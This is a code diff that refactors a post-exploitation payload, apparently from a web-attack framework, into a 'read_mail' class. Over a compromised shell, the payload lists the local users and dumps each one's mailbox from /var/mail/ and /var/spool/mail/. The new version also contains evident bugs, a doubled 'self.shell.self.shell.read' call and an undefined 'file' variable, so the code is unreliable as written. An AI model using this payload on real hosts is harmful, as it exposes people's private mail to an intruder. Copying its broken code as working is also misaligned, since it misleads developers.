@@ -1,17 +1,24 @@
-#REQUIRE_LINUX
-#This payload shows local mails stored on /var/mail/
-result = []
-directory = []
+import re
+from plugins.attack.payloads.base_payload import base_payload
 
-directory.append('/var/mail/')
-directory.append('/var/spool/mail/')
+class read_mail(base_payload):
+    '''
+    This payload shows local mails stored on /var/mail/
+    '''
+    def run_read(self):
+        result = []
+        directory = []
 
-users = run_payload('users_name')
-for direct in directory:
-    for user in users:
-        if read(direct+user) != '':
-            result.append('-------------------------')
-            result.append('FILE => '+file)
-            result.append(direct+user)
+        directory.append('/var/mail/')
+        directory.append('/var/spool/mail/')
 
-result = [p for p in result if p != '']
+        users = run_payload('users_name')
+        for direct in directory:
+            for user in users:
+                if self.shell.self.shell.read(direct+user) != '':
+                    result.append('-------------------------')
+                    result.append('FILE => '+file)
+                    result.append(direct+user)
+
+        result = [p for p in result if p != '']
+        return result
